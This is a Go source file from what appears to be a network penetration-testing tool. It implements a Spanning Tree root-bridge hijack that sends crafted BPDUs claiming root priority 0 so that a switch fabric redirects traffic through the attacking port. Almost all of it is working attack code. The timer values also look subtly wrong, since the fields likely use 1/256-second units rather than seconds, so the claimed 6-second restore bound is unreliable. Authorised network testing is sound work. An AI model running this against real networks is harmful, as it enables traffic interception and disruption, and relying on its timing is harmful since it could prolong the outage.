// stproot.go implements the STP root-bridge hijack check. Impact
// temporary, restore decay with a 6 s bound, affects fabric: the superior
// BPDUs (root priority 0, below the default 32768) make the attack leg
// the root bridge and redirect traffic, and the real root resumes once the
// 6 s max age the BPDUs carry runs out. The timers are the baseline's:
// message age 0, max age 6, hello time 1, forward delay 4. Their unit is
// whole seconds only if the field holds seconds, which no vendored source
// states (IEEE 802.1D is not vendored), so the 6 s bound is unverified.

package l2

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

// The BPDU timers, in the unit the field holds, and the hello time as the
// interval the check sends and pre-reads on.
const (
	stpMessageAge   = 0
	stpMaxAge       = 6
	stpHelloTime    = 1
	stpForwardDelay = 4
	stpHello        = stpHelloTime * time.Second
)

type stpRootFinding struct {
	Action       string `json:"action"`
	RootPriority uint16 `json:"root_priority"`
	MaxAge       uint16 `json:"max_age"`
	BurstCount   int    `json:"burst_count"`
}

// RunSTPRoot reads the leg for one hello time, bounded by half the window,
// for a BPDU from another sender and records its root identifier, then
// sends a superior BPDU
// claiming root with the attack leg's MAC as the bridge identity every
// hello time until the window ends or the predicate matches. The behavior
// reads no target: the timers and priority are probe content. The
// predicate is a BPDU from another sender whose root identifier is
// priority 0 and the attack leg's MAC, which confirms; a BPDU still naming
// another root at the window's end is resisted, and no BPDU before or
// after the probe is resisted as well, since a port that carries no BPDU
// shows nothing of the fabric.
func RunSTPRoot(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	src := deps.AttackLeg.Addr().MAC

	rootPriority := uint16(0)
	bpduPkt, err := craftSTPBPDU(src, rootPriority, stpMaxAge, stpHelloTime, stpForwardDelay, stpMessageAge)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "stproot: craft BPDU")
	}

	// The pre-read is bounded by half the window so the probe keeps the
	// other half.
	var lastRoot *layers.STPSwitchID
	_, pre, err := check.First(ctx, deps.AttackLeg, min(stpHello, deps.Observe/2), func(data []byte) bool {
		bpdu, ok := isBPDUFrom(data, src)
		if !ok {
			return false
		}
		id := bpdu.RouteID
		lastRoot = &id
		return true
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "stproot: receive BPDU")
	}

	sent := 0
	found, obs, err := check.Sustain(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, stpHello,
		func(ctx context.Context) error {
			if err := deps.AttackLeg.Send(ctx, bpduPkt); err != nil {
				return errs.Wrapf(err, "stproot: send BPDU %d", sent)
			}
			sent++
			return nil
		},
		func(data []byte) bool {
			bpdu, ok := isBPDUFrom(data, src)
			if !ok {
				return false
			}
			id := bpdu.RouteID
			lastRoot = &id
			return rootIsLeg(bpdu, src)
		})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "stproot: receive after the BPDU")
	}

	detail, _ := json.Marshal(stpRootFinding{
		Action:       "claim-root",
		RootPriority: rootPriority,
		MaxAge:       stpMaxAge,
		BurstCount:   sent,
	})
	deps.Emitter.Finding("stp", detail)

	observed := pre.Elapsed + obs.Elapsed
	switch {
	case found != nil:
		return check.Confirmed("a neighbor bridge names the attack leg as root", observed), nil
	case lastRoot == nil:
		return check.Resisted(fmt.Sprintf("no BPDU in %s", observed.Round(time.Millisecond)), observed), nil
	}
	return check.Resisted(fmt.Sprintf("the neighbor keeps root %s", rootString(*lastRoot)), observed), nil
}

// craftSTPBPDU builds a Configuration BPDU: Ethernet → LLC(0x42/0x42/0x03) →
// the 35-octet body.
func craftSTPBPDU(src net.HardwareAddr, rootPriority, maxAge, helloTime, forwardDelay, msgAge uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       stpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLLC,
	}
	llc := &layers.LLC{
		DSAP:    0x42,
		SSAP:    0x42,
		Control: 3,
	}
	stp := buildSTPPayload(rootPriority, src, maxAge, helloTime, forwardDelay, msgAge)
	return craft.Default(eth, llc, gopacket.Payload(stp))
}

// buildSTPPayload builds the STP Configuration BPDU body.
func buildSTPPayload(rootPriority uint16, bridgeMAC net.HardwareAddr, maxAge, helloTime, forwardDelay, msgAge uint16) []byte {
	out := make([]byte, 0, 35)
	// Protocol ID = 0.
	out = append(out, 0x00, 0x00)
	// Version = 0.
	out = append(out, 0x00)
	// BPDU type = 0x00 (Configuration).
	out = append(out, 0x00)
	// Flags = 0x00.
	out = append(out, 0x00)
	// Root ID: priority + MAC.
	rootID := make([]byte, 8)
	binary.BigEndian.PutUint16(rootID[0:2], rootPriority)
	copy(rootID[2:8], bridgeMAC)
	out = append(out, rootID...)
	// Root path cost = 0.
	out = append(out, 0x00, 0x00, 0x00, 0x00)
	// Bridge ID: same as root (we are the root).
	bridgeID := make([]byte, 8)
	binary.BigEndian.PutUint16(bridgeID[0:2], rootPriority)
	copy(bridgeID[2:8], bridgeMAC)
	out = append(out, bridgeID...)
	// Port ID = 0x8001.
	portID := make([]byte, 2)
	binary.BigEndian.PutUint16(portID, 0x8001)
	out = append(out, portID...)
	// Message age.
	ma := make([]byte, 2)
	binary.BigEndian.PutUint16(ma, msgAge)
	out = append(out, ma...)
	// Max age.
	mav := make([]byte, 2)
	binary.BigEndian.PutUint16(mav, maxAge)
	out = append(out, mav...)
	// Hello time.
	ht := make([]byte, 2)
	binary.BigEndian.PutUint16(ht, helloTime)
	out = append(out, ht...)
	// Forward delay.
	fd := make([]byte, 2)
	binary.BigEndian.PutUint16(fd, forwardDelay)
	out = append(out, fd...)
	return out
}
